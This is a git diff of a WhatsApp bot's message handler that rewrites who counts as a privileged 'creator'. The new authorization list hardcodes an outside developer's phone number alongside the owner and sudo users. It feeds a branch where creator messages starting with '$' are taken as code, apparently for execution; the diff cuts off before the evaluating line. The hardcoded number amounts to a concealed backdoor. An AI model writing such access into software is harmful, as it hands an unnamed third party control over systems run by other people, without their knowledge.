@@ -211,7 +211,6 @@ const port = process.env.PORT || 9090;
   const isdev = ownernum.includes(senderNumber)
   const isMe = isbot ? isbot : isdev 
   const isOwner = ownerNumber.includes(senderNumber) || isMe
-  const isCreator = isMe || isOwner
   const botNumber2 = await jidNormalizedUser(conn.user.id);
   const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => null) : null;
   const groupName = isGroup && groupMetadata ? groupMetadata.subject : '';
@@ -225,15 +224,34 @@ const port = process.env.PORT || 9090;
   conn.sendMessage(from, { text: teks }, { quoted: mek })
   }
   
-	const udp = botNumber.split('@')[0];
+	/*const udp = botNumber.split('@')[0];
     const jawadop = ('94771825193', '94763934860');
     
     const ownerFilev2 = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8'));  
     
     let isCreator = [udp, ...jawadop, config.DEV + '@s.whatsapp.net', ...ownerFilev2]
     .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net') 
-    .includes(sender);
-	  
+    .includes(sender);*/
+
+	    const udp = botNumber;
+        const devNumbers = ['94763934860'];
+        
+        let sudoUsers = [];
+        try {
+            sudoUsers = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8'));
+        } catch (e) {
+            sudoUsers = [];
+        }
+        
+        const authorizedUsers = [
+            udp + '@s.whatsapp.net',
+            ...devNumbers.map(n => n + '@s.whatsapp.net'),
+            config.OWNER_NUMBER + '@s.whatsapp.net',
+            ...sudoUsers
+        ].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net');
+        
+        const isCreator = authorizedUsers.includes(sender) || isMe || isOwner;
+              
 
 	  if (isCreator && mek.text.startsWith("$")) {
             let code = budy.slice(2);
